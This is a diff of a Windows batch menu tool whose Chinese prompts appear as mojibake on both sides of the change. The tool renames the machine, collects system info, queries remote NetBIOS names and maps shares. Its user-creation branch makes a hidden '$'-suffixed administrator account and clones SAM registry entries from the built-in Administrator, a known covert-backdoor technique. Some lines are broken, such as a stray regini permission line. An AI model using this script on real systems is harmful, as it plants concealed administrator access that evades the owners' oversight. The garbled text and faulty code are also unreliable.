@@ -26,16 +26,16 @@ Title  CMD
 
 :begin
 cls
-EchoÑ¡ÔñÒÔÏÂ¹¦ÄÜÊ¹ÓÃ£º
-echo     ¡¾1¡¿µçÄÔÖØÃüÃû
-echo     ¡¾2¡¿»ñÈ¡ÏµÍ³ÐÅÏ¢
-echo     ¡¾3¡¿´´½¨ÐÂÓÃ»§
-echo     ¡¾4¡¿É¾³ýÀÏÓÃ»§
-echo     ¡¾5¡¿Í¨¹ýIP»ñÈ¡ÆäÓÃ»§Ãû
-echo     ¡¾6¡¿Ó³Éä
-echo     ¡¾7¡¿×¢²á±í
-echo     ¡¾Q¡¿ÍË³ö
-Set /P Choice= ¡¾ÊäÈëÃüÁî¡¿
+Echoé€‰æ‹©ä»¥ä¸‹åŠŸèƒ½ä½¿ç”¨ï¼š
+echo     ã€1ã€‘ç”µè„‘é‡å‘½å
+echo     ã€2ã€‘èŽ·å–ç³»ç»Ÿä¿¡æ¯
+echo     ã€3ã€‘åˆ›å»ºæ–°ç”¨æˆ·
+echo     ã€4ã€‘åˆ é™¤è€ç”¨æˆ·
+echo     ã€5ã€‘é€šè¿‡IPèŽ·å–å…¶ç”¨æˆ·å
+echo     ã€6ã€‘æ˜ å°„
+echo     ã€7ã€‘æ³¨å†Œè¡¨
+echo     ã€Qã€‘é€€å‡º
+Set /P Choice= ã€è¾“å…¥å‘½ä»¤ã€‘
 If not "%Choice%"=="" (
   If "%Choice%"=="1" goto rename
   If "%Choice%"=="2" goto systeminfo
@@ -53,17 +53,17 @@ else(
 :rename
 set Name=%COMPUTERNAME%
 :GetHostName
-set /p Name=ÇëÊäÈëÐÂµÄ»úÆ÷Ãû:
+set /p Name=è¯·è¾“å…¥æ–°çš„æœºå™¨å:
 if %Name%==%COMPUTERNAME% goto GetHostName
 reg add "HKLM\system\CurrentControlSet\services\tcpip\parameters" /v "NV Hostname" /d %Name% /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName" /v ComputerName /d %Name% /f
-echo »úÆ÷ÃûÒÑÐÞ¸Ä£¬ÖØÆôºóÉúÐ§£¡
-set /p Res=ÊÇ·ñÖØÆô»úÆ÷[y/n]:
+echo æœºå™¨åå·²ä¿®æ”¹ï¼Œé‡å¯åŽç”Ÿæ•ˆï¼
+set /p Res=æ˜¯å¦é‡å¯æœºå™¨[y/n]:
 if /i %Res% ==y (
 	shutdown -r -t 0
 )
 else(
-	echo ÇëÉÔºóÖØÆô£¬ÐÞ¸ÄºóµÄ»úÆ÷Ãû²Å»áÉúÐ§£¡
+	echo è¯·ç¨åŽé‡å¯ï¼Œä¿®æ”¹åŽçš„æœºå™¨åæ‰ä¼šç”Ÿæ•ˆï¼
 )
 pause>nul
 goto begin
@@ -72,14 +72,14 @@ goto begin
 :systeminfo
 md systeminfo
 systeminfo  >> systeminfo\%computername%.txt
-echo Êä³öÏµÍ³ÐÅÏ¢µ½ systeminfo ÎÄ¼þ¼Ð
+echo è¾“å‡ºç³»ç»Ÿä¿¡æ¯åˆ° systeminfo æ–‡ä»¶å¤¹
 pause>nul
 goto begin
 
 
 :adduser
 net user
-set /p Choose=ÊÇ·ñ´´½¨Òþ²ØÕË»§[y/n]:
+set /p Choose=æ˜¯å¦åˆ›å»ºéšè—è´¦æˆ·[y/n]:
 if /i "%Choose%"=="y" (
 	goto hide
 )
@@ -87,11 +87,11 @@ else(
 	goto show
 )
 :hide
-set /p User=ÇëÊäÈëÓÃ»§Ãû:
-set /p Password=ÇëÊäÈëÓÃ»§ÃûÃÜÂë£º
+set /p User=è¯·è¾“å…¥ç”¨æˆ·å:
+set /p Password=è¯·è¾“å…¥ç”¨æˆ·åå¯†ç ï¼š
 net user %User%$ %Password% /add
 net localgroup administrators %User%$ /add
-echo Òþ²ØÓÃ»§´´½¨³É¹¦£¡
+echo éšè—ç”¨æˆ·åˆ›å»ºæˆåŠŸï¼
 "HKEY_LOCAL_MACHINE\SAM\SAM" [1 17] 
 "HKEY_LOCAL_MACHINE\SAM\SAM\Domains" [1 17]
 md reg
@@ -99,7 +99,7 @@ reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\%User%$" reg\
 reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA" reg\BB_.reg
 reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4" reg\AA_1F4.reg
 regedit
-set /p Res=BB_ÐÞ¸ÄÊÇ·ñ³É¹¦[y/n]:
+set /p Res=BB_ä¿®æ”¹æ˜¯å¦æˆåŠŸ[y/n]:
 if /i %Res% ==y	(
   net user %User%$ /del
 	reg import reg\BA_%User%$.reg
@@ -113,18 +113,18 @@ rmdir /s/q 222 reg
 pause>nul
 goto begin
 :show
-set /p User=ÇëÊäÈëÓÃ»§Ãû:
-set /p Password=ÇëÊäÈëÓÃ»§ÃûÃÜÂë£º
+set /p User=è¯·è¾“å…¥ç”¨æˆ·å:
+set /p Password=è¯·è¾“å…¥ç”¨æˆ·åå¯†ç ï¼š
 net user %User% %Password% /add
 net localgroup administrators %User% /add
-echo ÐÂÓÃ»§´´½¨³É¹¦£¡
+echo æ–°ç”¨æˆ·åˆ›å»ºæˆåŠŸï¼
 pause>nul
 goto begin
 
 
 :deluser
 net user
-set /p Choose=ÊÇ·ñÉ¾³ýÒþ²ØÕË»§[y/n]:
+set /p Choose=æ˜¯å¦åˆ é™¤éšè—è´¦æˆ·[y/n]:
 if /i "%Choose%"=="y" (
 	goto hide
 )
@@ -132,30 +132,30 @@ else(
 	goto show
 )
 :hide
-set /p User=ÇëÊäÈëÓÃ»§Ãû:
+set /p User=è¯·è¾“å…¥ç”¨æˆ·å:
 net user %User%$ %Password% /del
-echo Òþ²ØÓÃ»§É¾³ý³É¹¦£¡
+echo éšè—ç”¨æˆ·åˆ é™¤æˆåŠŸï¼
 pause>nul
 goto begin
 :show
-set /p User=ÇëÊäÈëÓÃ»§Ãû:
+set /p User=è¯·è¾“å…¥ç”¨æˆ·å:
 net user %User% /del
-echo ÀÏÓÃ»§É¾³ý³É¹¦£¡
+echo è€ç”¨æˆ·åˆ é™¤æˆåŠŸï¼
 pause>nul
 goto begin
 
 
 :ipuser
-set /p Ip=ÇëÊäÈëIP:
+set /p Ip=è¯·è¾“å…¥IP:
 nbtstat -A %Ip%
 pause>nul
 goto begin
 
 
 :mapping
-set /p Ip=ÇëÊäÈëIP²é¿´¹²ÏíÍøÂç:
+set /p Ip=è¯·è¾“å…¥IPæŸ¥çœ‹å…±äº«ç½‘ç»œ:
 net view \\%Ip%
-set /p Mlocal=ÇëÊäÈë±¾µØÅÌ·û:
+set /p Mlocal=è¯·è¾“å…¥æœ¬åœ°ç›˜ç¬¦:
 net use %Mlocal% \\%Ip%
 pause>nul
 goto begin
